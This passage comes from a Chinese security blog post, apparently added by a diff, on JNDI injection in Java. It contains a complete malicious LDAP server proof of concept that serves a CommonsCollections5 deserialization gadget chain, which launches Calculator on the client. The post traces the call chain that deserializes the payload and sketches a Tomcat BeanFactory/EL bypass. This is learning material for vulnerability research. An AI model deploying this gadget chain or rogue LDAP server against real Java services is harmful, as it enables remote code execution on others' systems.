class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>LDAPServer.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LDAPServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( String[] tmp_args )</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> String[]&#123;<span class="string">&quot;http://127.0.0.1:80/#testObject&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">7777</span>;</span><br><span class="line"></span><br><span class="line">        InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(args[ <span class="number">0</span> ])));</span><br><span class="line">        InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,CommonsCollections5());</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] CommonsCollections5() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map map=<span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException=<span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field field=badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个POC修改自：<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">LDAPRefServer.java</a> </p>
+<p>同样使用之前的JNDIClient进行<code>lookup</code>操作触发漏洞：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094015836593.jpg" alt="-w1791"></p>
+<h4 id="调用链分析-1"><a href="#调用链分析-1" class="headerlink" title="调用链分析"></a>调用链分析</h4><p>通过POC来看这个漏洞是如果被调用的，最终的调用栈如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">deserializeObject(byte[], ClassLoader):532, Obj (com.sun.jndi.ldap), Obj.java</span><br><span class="line">decodeObject(Attributes):239, Obj (com.sun.jndi.ldap), Obj.java</span><br><span class="line">c_lookup(Name, Continuation):1051, LdapCtx (com.sun.jndi.ldap), LdapCtx.java</span><br><span class="line">p_lookup(Name, Continuation):542, ComponentContext (com.sun.jndi.toolkit.ctx), ComponentContext.java</span><br><span class="line">lookup(Name):177, PartialCompositeContext (com.sun.jndi.toolkit.ctx), PartialCompositeContext.java</span><br><span class="line">lookup(String):205, GenericURLContext (com.sun.jndi.toolkit.url), GenericURLContext.java</span><br><span class="line">lookup(String):94, ldapURLContext (com.sun.jndi.url.ldap), ldapURLContext.java</span><br><span class="line">lookup(String):417, InitialContext (javax.naming), InitialContext.java</span><br><span class="line">main(String[]):7, JNDIClient (jndi_test1), JNDIClient.java</span><br></pre></td></tr></table></figure>
+
+<p>前面的一些变量传递就不看了，主要来看<code>c_lookup</code>方法处：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094890483818.jpg" alt="-w1387"></p>
+<p>这里先通过<code>this.doSearchOnce</code>获取到<code>LdapResult对象</code>，里面包含了poc里面所传递的对象：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094891282776.jpg" alt="-w808"></p>
+<p>在693行有了一个判断，判断var4是否有<code>javaClassName</code>这个Attribute。</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094893333224.jpg" alt="-w1000"></p>
+<p>如果有的话，则进入<code>Obj.decodeObject</code>这个方法：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094895708716.jpg" alt="-w1000"></p>
+<p>这里又有一个判断，判断var0是否有<code>javaSeralizedData</code>这个Attribute。有的话就传入到<code>deserializeObject</code>进行反序列化。</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094896717514.jpg" alt="-w1051"></p>
+<p>所以只要满足这两个条件，并且<code>javaSeralizedData</code>这个Attribute的值是一个序列化后的恶意对象，就可以进行利用了。可以看到POC中是设置了这两个Attribute的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>); <span class="comment">// 设置javaClassName</span></span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,CommonsCollections5()); <span class="comment">// 设置了javaSerializedData</span></span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用本地Class作为Reference-Factory-待学习"><a href="#利用本地Class作为Reference-Factory-待学习" class="headerlink" title="利用本地Class作为Reference Factory(待学习)"></a>利用本地Class作为Reference Factory(待学习)</h3><p>由于环境依赖存在问题一直没解决，下面的库没找到安装的方法。这个利用方式就先放一下。如果有师傅遇到同样的问题并且解决了的话，希望师傅可以分享一下解决的办法~</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单理解这个利用方式：寻找本地的CLASSPATH中的一个工厂类，工厂类需要实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。存在于Tomcat依赖包中的org.apache.naming.factory.BeanFactory的这个包正好满足这个条件。再根据这个类中的一些解析特性最后利用<code>java.el.ELProcessor</code>构造EL表达式达到命令执行。</p>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">Exploiting JNDI Injections in Java</a></li>
+<li><a target="_blank" rel="noopener" href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">如何绕过高版本JDK的限制进行JNDI注入利用</a></li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/">BlackHat 2016 回顾之 JNDI 注入简单解析</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8214">JNDI注入学习</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">A JOURNEY FROM JNDI/LDAP MANIPULATION TO REMOTE CODE EXECUTION DREAM LAND</a></li>
+<li><a target="_blank" rel="noopener" href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">如何绕过高版本JDK的限制进行JNDI注入利用</a></li>
+<li><a target="_blank" rel="noopener" href="https://payloads.info/2020/06/24/Java%E5%AE%89%E5%85%A8-JNDI-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">Java安全-JNDI-学习总结</a></li>
+</ul>
+
+    </div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
